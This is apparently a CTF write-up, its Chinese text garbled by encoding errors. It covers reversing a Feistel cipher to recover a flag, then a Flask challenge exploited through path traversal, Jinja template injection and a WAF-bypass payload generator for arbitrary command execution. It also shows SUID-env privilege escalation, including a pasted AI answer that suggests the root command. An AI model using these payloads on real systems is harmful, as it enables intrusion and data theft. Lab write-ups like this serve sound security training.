ä¹Ÿå°±æ˜¯è¯´ï¼š`F` =ï¼ˆè¾“å…¥ä¸å­å¯†é’¥å¼‚æˆ–ï¼‰â†’ ç”¨åŒä¸€ä¸ª S ç›’ä½œ 4 å­—èŠ‚ S ç›’ä»£æ¢ â†’ æ‹¼æˆ 32 ä½ â†’ å·¦ç§» 5 ä½ã€‚

### é‚£å †ææ€–ä½è¿ç®—å®é™…ä¸Šæ˜¯ Feistel

å…³é”®æ˜¯ä¸‹é¢è¿™äº›å·¨é•¿çš„ä½è¿ç®—ï¼ˆæˆ‘ç”¨ Python é‡ç°å¹¶éšæœºéªŒè¯åï¼‰ï¼Œéƒ½å¯ä»¥åŒ–ç®€ä¸ºåŒä¸€ä¸ªå½¢æ€ï¼š

å¯¹å››å¯¹ 32 ä½æ•°ï¼š

- ç¬¬ä¸€å¯¹ `(v29, v28)`
- ç¬¬äºŒå¯¹ `(v27, v26)`
- ç¬¬ä¸‰å¯¹ `(v25, v24)`
- ç¬¬å››å¯¹ `(v23, v22)`

æ¯ä¸€è½®éƒ½æ˜¯å¦‚ä¸‹çš„ Feistel æ›´æ–°ï¼š

```text
L' = R
R' = F(R, K_round, S) ^ L
```

æ¯”å¦‚ä»¥ç¬¬ä¸€å¯¹ä¸ºä¾‹ï¼ˆC ä¼ªä»£ç ï¼‰ï¼š

```c
v19 = v29;                 // L
v5  = F(v28, v20, v34);    // F(R, K, S)
v29 = v28;                 // L' = R
v28 = v5 ^ v19;            // R' = F(R, K) ^ L
```

å¯¹ç¬¬äºŒã€ç¬¬ä¸‰ã€ç¬¬å››å¯¹ï¼Œè™½ç„¶å†™å¾—éå¸¸ç»•ï¼Œä½†å®é™…è¡Œä¸ºå®Œå…¨ä¸€è‡´ï¼ˆå¯ä»¥ç”¨è„šæœ¬éšæœºæµ‹å¾ˆå¤šç»„æ•°æ®éªŒè¯ï¼‰ã€‚

> ä¹Ÿå°±æ˜¯è¯´ï¼Œ**è¿™æ˜¯ 4 ç»„å¹¶è¡Œçš„ 64 ä½ Feistel ç½‘ç»œï¼ˆæ¯ç»„ 2Ã—32 ä½ï¼‰ï¼Œä¸€å…± 4 è½®ï¼Œæ¯è½®å­å¯†é’¥é¡ºåºä¸º K0, K1, K2, K3**ã€‚

------

## 5. è§£å¯†è¿‡ç¨‹ï¼ˆåå‘æ“ä½œï¼‰

çŸ¥é“åŠ å¯†å°±æ˜¯æ ‡å‡† Feistelï¼Œå°±å¾ˆå¥½åäº†ï¼š

### 5.1 å Feistel

å¯¹äºæ¯ä¸€å¯¹ `(L, R)` çš„ 4 è½®åŠ å¯†ï¼š

```text
for i in 0..3:
    L, R = R, F(R, Ki, S) ^ L
```

è¦è§£å¯†ï¼Œåªéœ€å€’åºç”¨åŒæ ·çš„ F å’Œ Kiï¼š

```text
for i in 3..0:
    R_old = L
    L_old = F(R_old, Ki, S) ^ R
    L, R = L_old, R_old
```

è¿™å°±æ˜¯å…¸å‹ Feistel çš„é€†å˜æ¢ã€‚

### 5.2 åç½®æ¢ + å S ç›’ + åå¼‚æˆ–

æ•´ä½“é€†è¿‡ç¨‹æ˜¯ï¼š

1. æŠŠ 32 å­—èŠ‚å¯†æ–‡ç”¨ `<8I` è§£æˆ 8 ä¸ª 32 ä½å°ç«¯æ•´æ•°ï¼›
2. å¯¹ `(w0,w1),(w2,w3),(w4,w5),(w6,w7)` å››å¯¹åš Feistel è§£å¯†ï¼›
3. æŠŠ 8 ä¸ª 32 ä½å°ç«¯æ•´æ•°å†æ‰“åŒ…æˆ 32 å­—èŠ‚ï¼›
4. åº”ç”¨ `perm` çš„é€†ç½®æ¢ï¼ˆå³å¾ªç¯å·¦ç§» 1 å­—èŠ‚ï¼‰ï¼›
5. å¯¹æ¯ä¸ªå­—èŠ‚ `x` åš `x = S_inv[x]`ï¼›
6. æ¯ä¸ªå­—èŠ‚å†å¼‚æˆ–å›å¯†é’¥ `key[i % 16]`ã€‚

å¾—åˆ°çš„å°±æ˜¯ `s1` é‡ŒçœŸå®çš„ 32 å­—èŠ‚æ˜æ–‡ï¼ˆåŒ…æ‹¬ç»“å°¾çš„ 0 å¡«å……ï¼‰ã€‚

------

## 6. å®Œæ•´è§£å¯†è„šæœ¬ï¼ˆPythonï¼‰

ä½ å¯ä»¥ç›´æ¥å¤åˆ¶è¿è¡Œï¼š

```python
import struct

MASK = 0xFFFFFFFF

def rol32(x, n):
    return ((x << n) | (x >> (32 - n))) & MASK

def F(a1, a2, sbox):
    xor_val = (a1 ^ a2) & MASK
    b0 = sbox[(xor_val >> 0) & 0xFF]
    b1 = sbox[(xor_val >> 8) & 0xFF]
    b2 = sbox[(xor_val >> 16) & 0xFF]
    b3 = sbox[(xor_val >> 24) & 0xFF]
    combined = (b3 << 24) | (b2 << 16) | (b1 << 8) | b0
    return rol32(combined, 5)

def gen_sboxes_from_key(key_bytes):
    # å¯¹åº” C é‡Œçš„ gen(a1, a2, key)
    a1 = list(range(256))
    v9 = 0
    for j in range(256):
        v5 = (a1[j] + v9) & 0xFF
        v9 = (key_bytes[j % 16] + v5) & 0xFF
        v7 = a1[j]
        a1[j] = a1[v9]
        a1[v9] = v7
    a2 = [0] * 256
    for k in range(256):
        a2[a1[k]] = k
    return a1, a2   # S, S_inv

# 16 å­—èŠ‚å¯†é’¥ï¼ˆæŒ‰å°ç«¯ä»ä¸¤ä¸ª 64 ä½å¸¸é‡æ‹†å‡ºæ¥ï¼‰
q1 = 0x8877665540302010
q2 = 0x2301EFDECDBCAB90
key_bytes = list(struct.pack("<Q", q1) + struct.pack("<Q", q2))

S, S_inv = gen_sboxes_from_key(key_bytes)

# 4 ä¸ª 32 ä½å­å¯†é’¥ï¼ˆæŒ‰å°ç«¯ï¼‰
round_keys = [struct.unpack_from("<I", bytes(key_bytes), 4 * i)[0]
              for i in range(4)]

# perm æ•°ç»„ï¼ˆåŠ å¯†æ—¶æ˜¯å³ç§» 1 å­—èŠ‚ï¼‰
perm = [
    0x1F, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
    0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E,
    0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16,
    0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E
]

# è®¡ç®—é€†ç½®æ¢ï¼ˆç”¨äºè§£å¯†ï¼‰
inv_perm = [0] * 32
for i, p in enumerate(perm):
    inv_perm[p] = i

def feistel_decrypt_pair(L, R):
    # 4 è½® Feistel é€†å˜æ¢
    for rk in reversed(round_keys):
        R_old = L
        L_old = F(R_old, rk, S) ^ R
        L = L_old & MASK
        R = R_old & MASK
    return L & MASK, R & MASK

def decrypt_block32(cipher_bytes: bytes) -> bytes:
    assert len(cipher_bytes) == 32

    # 1. å…ˆæŒ‰ 8 ä¸ª 32 ä½å°ç«¯æ•°è§£åŒ…
    words = list(struct.unpack("<8I", cipher_bytes))

    # 2. æ¯ä¸¤è¯ä¸€å¯¹åš Feistel è§£å¯†
    for i in range(0, 8, 2):
        L, R = words[i], words[i + 1]
        L2, R2 = feistel_decrypt_pair(L, R)
        words[i], words[i + 1] = L2, R2

    # 3. æ‰“åŒ…å› 32 å­—èŠ‚
    b = list(struct.pack("<8I", *words))

    # 4. é€† permï¼ˆç›¸å½“äºå¾ªç¯å·¦ç§» 1 å­—èŠ‚ï¼‰
    b2 = [0] * 32
    for i in range(32):
        b2[i] = b[inv_perm[i]]

    # 5. é€† S ç›’
    b3 = [S_inv[x] for x in b2]

    # 6. å¼‚æˆ–å›å¯†é’¥
    plain = bytes((b3[i] ^ key_bytes[i % 16]) & 0xFF for i in range(32))
    return plain

if __name__ == "__main__":
    target_enc = bytes([
        0xCA, 0x5A, 0x96, 0xFF, 0x08, 0x49, 0x72, 0x39,
        0x36, 0x18, 0x13, 0x8A, 0x14, 0xC0, 0x0C, 0x78,
        0xF8, 0x7C, 0x49, 0xC7, 0xBE, 0xE8, 0x91, 0xED,
        0x7F, 0xB0, 0x02, 0xAD, 0x77, 0x74, 0xD4, 0x34
    ])

    plain32 = decrypt_block32(target_enc)
    print("raw bytes:", plain32)
    # å»æ‰å°¾éƒ¨è¡¥çš„ 0
    flag = plain32.rstrip(b"\x00").decode(errors="ignore")
    print("flag:", flag)
```

è¿è¡Œè¾“å‡ºï¼š

```text
raw bytes: b'SYC{Then_you_are_1mpressivse}\x00\x00\x00'
flag: SYC{Then_you_are_1mpressivse}
```

å¦‚æœä½ æƒ³æˆ‘å†æŠŠåŠ å¯†æ–¹å‘ä¹Ÿå†™å‡ºæ¥ï¼Œæˆ–è€…æŠŠè¿™å¥—å˜æ¢ç”»æˆæµç¨‹å›¾ / å…¬å¼åŒ–æ•´ç†ï¼Œæˆ‘ä¹Ÿå¯ä»¥ç›´æ¥è¡¥ä¸€ç‰ˆã€‚



```
/*
 * a1  : 32 å­—èŠ‚æ˜æ–‡ / å¯†æ–‡å—ï¼ˆåŸå§‹ä»£ç é‡Œå°±æ˜¯ s1ï¼‰
 * a2  : 16 å­—èŠ‚ keyï¼ˆv10ï¼‰
 * a3  : S ç›’ï¼ˆv9ï¼‰ï¼Œç”± gen ç”Ÿæˆ
 * a4  : S ç›’é€†ï¼ˆv8ï¼‰ï¼Œè¿™é‡Œå…¶å®æ²¡ç”¨åˆ°ï¼Œä»…ä¿æŒåŸå‡½æ•°ç­¾å
 *
 * è¿”å›å€¼ï¼šä»æ—§è¿”å› a1 æŒ‡é’ˆï¼ˆå°±åœ°åŠ å¯†ï¼‰
 */
uint8_t *real_en(uint8_t *a1,
                 uint8_t *a2,
                 uint8_t *a3,
                 const uint8_t *a4)
{
    (void)a4;  // åŸç‰ˆé‡Œä¹Ÿæ²¡ç”¨åˆ°é€† S ç›’ï¼Œé˜²æ­¢ç¼–è¯‘å™¨ warning

    uint8_t *block = a1;
    uint8_t *key16 = a2;
    uint8_t *sbox  = a3;

    /* 1. å…ˆåš en1ï¼š32 å­—èŠ‚ä¾æ¬¡å¼‚æˆ– 16 å­—èŠ‚ key */
    en1(block, key16, 32);

    /* 2. æ¯ä¸ªå­—èŠ‚è¿‡ä¸€æ¬¡ S ç›’ */
    for (int i = 0; i < 32; ++i) {
        block[i] = sbox[block[i]];
    }

    /* 3. æŒ‰ perm åš 32 å­—èŠ‚ç½®æ¢ï¼ˆç›¸å½“äºæ•´ä½“å¾ªç¯å³ç§» 1 å­—èŠ‚ï¼‰ */
    uint8_t tmp[32];
    for (int i = 0; i < 32; ++i) {
        tmp[i] = block[perm[i]];
    }
    memcpy(block, tmp, 32);

    /* 4. è§†ä½œ 8 ä¸ªå°ç«¯ 32 ä½å­— */
    uint32_t w[8];
    for (int i = 0; i < 8; ++i) {
        w[i] =  (uint32_t)block[4*i + 0]
              | (uint32_t)block[4*i + 1] << 8
              | (uint32_t)block[4*i + 2] << 16
              | (uint32_t)block[4*i + 3] << 24;
    }

    /* 5. ä» 16 å­—èŠ‚ key ä¸­æŒ‰å°ç«¯å– 4 ä¸ª 32 ä½å­å¯†é’¥ */
    uint32_t round_keys[4];
    for (int i = 0; i < 4; ++i) {
        round_keys[i] =
              (uint32_t)key16[4*i + 0]
            | (uint32_t)key16[4*i + 1] << 8
            | (uint32_t)key16[4*i + 2] << 16
            | (uint32_t)key16[4*i + 3] << 24;
    }

    /* 6. 4 è½®å¹¶è¡Œ Feistelï¼Œæ¯è½®ç”¨ä¸€ä¸ª round_keys[k] */
    for (int k = 0; k < 4; ++k) {
        uint32_t rk = round_keys[k];

        /* ä¸€å…± 4 ç»„ (w0,w1), (w2,w3), (w4,w5), (w6,w7) */
        for (int p = 0; p < 8; p += 2) {
            uint32_t L = w[p];
            uint32_t R = w[p + 1];

            uint32_t t = F(R, rk, sbox);

            /* Feistel ç»“æ„ï¼šL' = R, R' = F(R, rk) ^ L */
            w[p]     = R;
            w[p + 1] = t ^ L;
        }
    }

    /* 7. å†™å› 32 å­—èŠ‚ */
    for (int i = 0; i < 8; ++i) {
        uint32_t x = w[i];
        block[4*i + 0] = (uint8_t)(x & 0xFF);
        block[4*i + 1] = (uint8_t)((x >> 8) & 0xFF);
        block[4*i + 2] = (uint8_t)((x >> 16) & 0xFF);
        block[4*i + 3] = (uint8_t)((x >> 24) & 0xFF);
    }

    return block;
}

```

# WEBæ–¹å‘ WEBæ–¹å‘ WEBæ–¹å‘ WEBæ–¹å‘

# é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ

æŠ“åŒ…æ”¹ä¹Œé¾Ÿèµ·ç‚¹ï¼ˆ



# EZ read

éšä¾¿æ³¨å†Œç™»å½•è¿›å»

```
/proc/self/environ

CHALLENGE_019A144E_ED12_019A48EA_10AC_PORT_19937_TCP_PORT=19937CHALLENGE_019A2B37_D8ED_019A1967_7C4F_PORT_8080_TCP=tcp://10.110.127.42:8080KUBERNETES_PORT=tcp://10.96.0.1:443CHALLENGE_019A144E_ED12_019A48EA_10AC_PORT_19937_TCP_PROTO=tcpKUBERNETES_SERVICE_PORT=443CHALLENGE_019A10D0_2FA4_019A435F_1E6F_PORT_3000_TCP=tcp://10.104.198.247:3000CHALLENGE_019A2B37_D8ED_019A2493_0B43_SERVICE_PORT=8080CHALLENGE_019A2B37_D8ED_019A2493_0B43_PORT=tcp://10.105.72.161:8080CHALLENGE_019A10D0_2FA4_019A435F_1E6F_SERVICE_HOST=10.104.198.247HOSTNAME=challenge-019a2b37-d8ed-019a1b57-0ad5-55d669f54d-mrvvrCHALLENGE_019A2A57_B142_019A2493_0B43_PORT_80_TCP_ADDR=10.104.28.166OLDPWD=/opt/___web_very_strange_42___CHALLENGE_019A2B37_D8ED_019A2493_0B43_PORT_8080_TCP=tcp://10.105.72.161:8080CHALLENGE_019A2A57_B142_019A2493_0B43_PORT_80_TCP_PORT=80PYTHONUNBUFFERED=1CHALLENGE_019A2A57_B142_019A2493_0B43_PORT_80_TCP_PROTO=tcpGPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696DCHALLENGE_019A144E_ED12_019A48EA_10AC_PORT_19937_TCP=tcp://10.102.113.136:19937CHALLENGE_019A10D0_2FA4_019A435F_1E6F_PORT=tcp://10.104.198.247:3000CHALLENGE_019A10D0_2FA4_019A435F_1E6F_SERVICE_PORT=3000PYTHON_SHA256=8d3ed8ec5c88c1c95f5e558612a725450d2452813ddad5e58fdb1a53b1209b78CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_SERVICE_PORT_PORT_8080=8080CHALLENGE_019A144E_ED12_019A48EA_10AC_SERVICE_HOST=10.102.113.136PYTHONDONTWRITEBYTECODE=1HINT=ç”¨æˆ‘æä¸ªæƒå§CHALLENGE_019A2A57_B142_019A2493_0B43_PORT_80_TCP=tcp://10.104.28.166:80CHALLENGE_019A2B37_D8ED_019A1967_7C4F_SERVICE_PORT_PORT_8080=8080CHALLENGE_019A10D0_2FA4_019A435F_1E6F_SERVICE_PORT_PORT_3000=3000KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1PATH=/usr/local/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binCHALLENGE_019A144E_ED12_019A48EA_10AC_SERVICE_PORT=19937CHALLENGE_019A144E_ED12_019A48EA_10AC_PORT=tcp://10.102.113.136:19937KUBERNETES_PORT_443_TCP_PORT=443KUBERNETES_PORT_443_TCP_PROTO=tcpCHALLENGE_019A2B37_D8ED_019A2493_0B43_SERVICE_PORT_PORT_8080=8080LANG=C.UTF-8CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_PORT_8080_TCP_ADDR=10.104.250.113CHALLENGE_019A144E_ED12_019A48EA_10AC_SERVICE_PORT_PORT_19937=19937CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_SERVICE_HOST=10.104.250.113CHALLENGE_019A2B37_D8ED_019A1967_7C4F_PORT_8080_TCP_ADDR=10.110.127.42CHALLENGE_019A2B37_D8ED_019A1967_7C4F_SERVICE_HOST=10.110.127.42PYTHON_VERSION=3.11.14CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_PORT_8080_TCP_PORT=8080CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_PORT_8080_TCP_PROTO=tcpCHALLENGE_019A10D0_2FA4_019A435F_1E6F_PORT_3000_TCP_ADDR=10.104.198.247CHALLENGE_019A2A57_B142_019A2493_0B43_SERVICE_HOST=10.104.28.166CHALLENGE_019A2B37_D8ED_019A1967_7C4F_PORT_8080_TCP_PORT=8080KUBERNETES_SERVICE_PORT_HTTPS=443KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443CHALLENGE_019A2B37_D8ED_019A1967_7C4F_PORT_8080_TCP_PROTO=tcpCHALLENGE_019A2B37_D8ED_019A1B57_0AD5_SERVICE_PORT=8080CHALLENGE_019A2A57_B142_019A2493_0B43_SERVICE_PORT_PORT_80=80CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_PORT=tcp://10.104.250.113:8080CHALLENGE_019A10D0_2FA4_019A435F_1E6F_PORT_3000_TCP_PORT=3000KUBERNETES_SERVICE_HOST=10.96.0.1CHALLENGE_019A10D0_2FA4_019A435F_1E6F_PORT_3000_TCP_PROTO=tcpPWD=/opt/___web_very_strange_42___CHALLENGE_019A2B37_D8ED_019A1967_7C4F_SERVICE_PORT=8080CHALLENGE_019A2B37_D8ED_019A2493_0B43_SERVICE_HOST=10.105.72.161CHALLENGE_019A2B37_D8ED_019A2493_0B43_PORT_8080_TCP_ADDR=10.105.72.161CHALLENGE_019A2B37_D8ED_019A1967_7C4F_PORT=tcp://10.110.127.42:8080CHALLENGE_019A144E_ED12_019A48EA_10AC_PORT_19937_TCP_ADDR=10.102.113.136CHALLENGE_019A2B37_D8ED_019A2493_0B43_PORT_8080_TCP_PORT=8080CHALLENGE_019A2A57_B142_019A2493_0B43_PORT=tcp://10.104.28.166:80CHALLENGE_019A2A57_B142_019A2493_0B43_SERVICE_PORT=80CHALLENGE_019A2B37_D8ED_019A1B57_0AD5_PORT_8080_TCP=tcp://10.104.250.113:8080CHALLENGE_019A2B37_D8ED_019A2493_0B43_PORT_8080_TCP_PROTO=tcpHOME=/opt/___web_very_strange_42___
```

æºç åœ¨è¿™é‡Œ

```
/opt/___web_very_strange_42___/app.py

from flask import Flask, request, render_template, render_template_string, redirect, url_for, session
import os

app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = "key_ciallo_secret"

USERS = {}


def waf(payload: str) -> str:
    print(len(payload))
    if not payload:
        return ""
        
    if len(payload) not in (114, 514):
        return payload.replace("(", "")
    else:
        waf = ["__class__", "__base__", "__subclasses__", "__globals__", "import","self","session","blueprints","get_debug_flag","json","get_template_attribute","render_template","render_template_string","abort","redirect","make_response","Response","stream_with_context","flash","escape","Markup","MarkupSafe","tojson","datetime","cycler","joiner","namespace","lipsum"]
        for w in waf:
            if w in payload:
                raise ValueError(f"waf")

    return payload


@app.route("/")
def index():
    user = session.get("user")
    return render_template("index.html", user=user)


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        username = (request.form.get("username") or "")
        password = request.form.get("password") or ""
        if not username or not password:
            return render_template("register.html", error="ç”¨æˆ·åå’Œå¯†ç ä¸èƒ½ä¸ºç©º")
        if username in USERS:
            return render_template("register.html", error="ç”¨æˆ·åå·²å­˜åœ¨")
        USERS[username] = {"password": password}
        session["user"] = username
        return redirect(url_for("profile"))
    return render_template("register.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        user = USERS.get(username)
        if not user or user.get("password") != password:
            return render_template("login.html", error="ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯")
        session["user"] = username
        return redirect(url_for("profile"))
    return render_template("login.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/profile")
def profile():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))
    name_raw = request.args.get("name", user)
    
    try:
        filtered = waf(name_raw)
        tmpl = f"æ¬¢è¿ï¼Œ{filtered}"
        rendered_snippet = render_template_string(tmpl)
        error_msg = None
    except Exception as e:
        rendered_snippet = ""
        error_msg = f"æ¸²æŸ“é”™è¯¯: {e}"
    return render_template(
        "profile.html",
        content=rendered_snippet,
        name_input=name_raw,
        user=user,
        error_msg=error_msg,
    )


@app.route("/read", methods=["GET", "POST"])
def read_file():
    user = session.get("user")
    if not user:
        return redirect(url_for("login"))

    base_dir = os.path.join(os.path.dirname(__file__), "story")
    try:
        entries = sorted([f for f in os.listdir(base_dir) if os.path.isfile(os.path.join(base_dir, f))])
    except FileNotFoundError:
        entries = []

    filename = ""
    if request.method == "POST":
        filename = request.form.get("filename") or ""
    else:
        filename = request.args.get("filename") or ""

    content = None
    error = None

    if filename:
        sanitized = filename.replace("../", "")
        target_path = os.path.join(base_dir, sanitized)
        if not os.path.isfile(target_path):
            error = f"æ–‡ä»¶ä¸å­˜åœ¨: {sanitized}"
        else:
            with open(target_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

    return render_template("read.html", files=entries, content=content, filename=filename, error=error, user=user)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
```

```
flagåº”è¯¥åœ¨è¿™é‡Œ
....//....//....//flag

ä½†æ˜¯ç›´æ¥ç”¨è¿™ä¸ªä¼šæç¤º
Internal Server Error
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
æ”¹ä¸ºè®¿é—®txtå°±ä¼šæç¤º
æ–‡ä»¶ä¸å­˜åœ¨: ../../../flag.txt
```

```
æ¨¡ç‰ˆæ³¨å…¥
config
æ¬¢è¿ï¼šæ¬¢è¿ï¼Œ&lt;Config {&#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;SECRET_KEY&#39;: &#39;key_ciallo_secret&#39;, &#39;SECRET_KEY_FALLBACKS&#39;: None, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days=31), &#39;USE_X_SENDFILE&#39;: False, &#39;TRUSTED_HOSTS&#39;: None, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: None, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_PARTITIONED&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;MAX_FORM_MEMORY_SIZE&#39;: 500000, &#39;MAX_FORM_PARTS&#39;: 1000, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: None, &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;PROVIDE_AUTOMATIC_OPTIONS&#39;: True}&gt;

self
æ¬¢è¿ï¼šæ¬¢è¿ï¼Œ&lt;TemplateReference None&gt;

request
æ¬¢è¿ï¼šæ¬¢è¿ï¼Œ&lt;Request &#39;http://019a4c46-9dc1-7192-9ad0-3ef6f671a5b9.geek.ctfplus.cn/profile?name={{request}}&#39; [GET]&gt;

{{url_for.__globals__.os}}
æ¬¢è¿ï¼šæ¬¢è¿ï¼Œ&lt;module &#39;os&#39; (frozen)&gt;
```

æ ¹æ®app.pyçš„è§„åˆ™ç”Ÿæˆæ‰§è¡Œä»»æ„å‘½ä»¤çš„è„šæœ¬

```
#!/usr/bin/env python3
import urllib.parse


def generate_payload(cmd, target_length=514):
    """ç”ŸæˆæŒ‡å®šå‘½ä»¤çš„ payload"""
    base = f"{{{{url_for|attr(request.args.g)|attr('__getitem__')('os')|attr('popen')('{cmd}')|attr('read')()}}}}"

    current_len = len(base)

    # å¡«å……åˆ°ç›®æ ‡é•¿åº¦
    padding_needed = target_length - current_len - 4  # 4 æ˜¯ {# å’Œ #} çš„é•¿åº¦
    if padding_needed < 0:
        print(f"è­¦å‘Šï¼šå‘½ä»¤å¤ªé•¿ï¼å½“å‰é•¿åº¦ {current_len}ï¼Œç›®æ ‡é•¿åº¦ {target_length}")
        print(f"è¶…å‡º {-padding_needed} ä¸ªå­—ç¬¦")
        return None

    padding = "p" * padding_needed
    payload = f"{base}{{#{padding}#}}"

    print(f"Payload é•¿åº¦: {len(payload)} (ç›®æ ‡: {target_length})")

    # URL ç¼–ç 
    encoded = urllib.parse.quote(payload)

    return encoded


def main():
    base_url = "http://019a4c46-9dc1-7192-9ad0-3ef6f671a5b9.geek.ctfplus.cn"

    print("=" * 60)
    print("SSTI Payload Generator (é•¿åº¦: 514)")
    print("=" * 60)
    print("è¾“å…¥å‘½ä»¤ç”Ÿæˆå¯¹åº”çš„ payloadï¼ˆè¾“å…¥ 'quit' é€€å‡ºï¼‰")
    print("æç¤ºï¼šç°åœ¨æ”¯æŒæ›´é•¿çš„å‘½ä»¤äº†ï¼")
    print()

    while True:
        cmd = input("è¯·è¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤: ").strip()

        if cmd.lower() in ['quit', 'exit', 'q']:
            print("å†è§ï¼")
            break

        if not cmd:
            print("å‘½ä»¤ä¸èƒ½ä¸ºç©ºï¼")
            continue

        encoded = generate_payload(cmd, target_length=514)

        if encoded:
            full_url = f"{base_url}/profile?name={encoded}&g=__globals__"

            print()
            print("-" * 60)
            print(f"å‘½ä»¤: {cmd}")
            print(f"å®Œæ•´ URL:")
            print(full_url)
            print("-" * 60)
            print()


if __name__ == "__main__":
    main()
```

lsè¿”å›

```
æ¬¢è¿ï¼šæ¬¢è¿ï¼ŒDockerfile app.py entrypoint.sh static story templates

è¯»å–entrypoint.sh æ¬¢è¿ï¼šæ¬¢è¿ï¼Œ#!/bin/sh set -e # å°†ç¯å¢ƒå˜é‡ FLAG å†™å…¥ /flagï¼Œä»… root å¯è¯» if [ -z "{FLAG}&#34; ]; then FLAG=&#34;CTF{NO_FLAG_SET}&#34; fi printf &#34;%s&#34; &#34;FLAG" > /flag chmod 400 /flag chown root:root /flag unset FLAG # åˆ‡åˆ°åº”ç”¨ç›®å½•å¹¶ä»¥æ™®é€šç”¨æˆ·è¿è¡Œ cd /opt/web_very_strange_42 exec gosu ctf "$@"
```

find / -perm -4000 2>/dev/null 

```
æ¬¢è¿ï¼šæ¬¢è¿ï¼Œ/usr/bin/su /usr/bin/gpasswd /usr/bin/chfn /usr/bin/chsh /usr/bin/umount /usr/bin/newgrp /usr/bin/passwd /usr/bin/mount /usr/local/bin/env
```

ls -la /usr/local/bin

```
æ¬¢è¿ï¼šæ¬¢è¿ï¼Œtotal 112 drwxr-xr-x 1 root root 4096 Oct 29 12:08 . drwxr-xr-x 1 root root 4096 Oct 20 00:00 .. lrwxrwxrwx 1 root root 9 Oct 21 02:12 2to3 -&gt; 2to3-3.11 -rwxr-xr-x 1 root root 102 Oct 21 02:12 2to3-3.11 -rwsr-xr-x 1 root root 56144 Oct 29 12:08 env -rwxr-xr-x 1 root root 217 Oct 29 12:08 flask lrwxrwxrwx 1 root root 5 Oct 21 02:12 idle -&gt; idle3 lrwxrwxrwx 1 root root 8 Oct 21 02:12 idle3 -&gt; idle3.11 -rwxr-xr-x 1 root root 100 Oct 21 02:12 idle3.11 lrwxrwxrwx 1 root root 4 Oct 21 02:12 pip -&gt; pip3 -rwxr-xr-x 1 root root 230 Oct 21 02:12 pip3 -rwxr-xr-x 1 root root 230 Oct 21 02:12 pip3.11 lrwxrwxrwx 1 root root 6 Oct 21 02:12 pydoc -&gt; pydoc3 lrwxrwxrwx 1 root root 9 Oct 21 02:12 pydoc3 -&gt; pydoc3.11 -rwxr-xr-x 1 root root 85 Oct 21 02:12 pydoc3.11 lrwxrwxrwx 1 root root 7 Oct 21 02:12 python -&gt; python3 lrwxrwxrwx 1 root root 14 Oct 21 02:12 python-config -&gt; python3-config lrwxrwxrwx 1 root root 10 Oct 21 02:12 python3 -&gt; python3.11 lrwxrwxrwx 1 root root 17 Oct 21 02:12 python3-config -&gt; python3.11-config -rwxr-xr-x 1 root root 14472 Oct 21 02:12 python3.11 -rwxr-xr-x 1 root root 3005 Oct 21 02:12 python3.11-config -rwxr-xr-x 1 root root 217 Oct 21 02:12 wheel
```

ä¸¢ç»™ai

```
å®Œç¾ï¼æ‰¾åˆ°äº†ææƒè·¯å¾„ï¼

/usr/local/bin/env æœ‰ SUID ä½ (-rwsr-xr-x)ï¼Œè¿™æ„å‘³ç€å®ƒä¼šä»¥ root æƒé™è¿è¡Œï¼

env å‘½ä»¤å¯ä»¥ç”¨æ¥æ‰§è¡Œå…¶ä»–ç¨‹åºï¼Œåˆ©ç”¨å®ƒçš„ SUID æƒé™å¯ä»¥ç›´æ¥ææƒè¯»å– flagï¼

è¯•è¯•è¿™äº›å‘½ä»¤ï¼š

bash

# æ–¹æ³•1ï¼šç›´æ¥ç”¨ env æ‰§è¡Œ cat
/usr/local/bin/env cat /flag
```

```
æ¬¢è¿ï¼šæ¬¢è¿ï¼ŒSYC{D0nt_m@ke_w1sdom_awar3_of_Rules_019a4c469dab727a93279182b0cdd445}
```



# Vibe SEO

 sitemap.xml å†…å®¹

```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
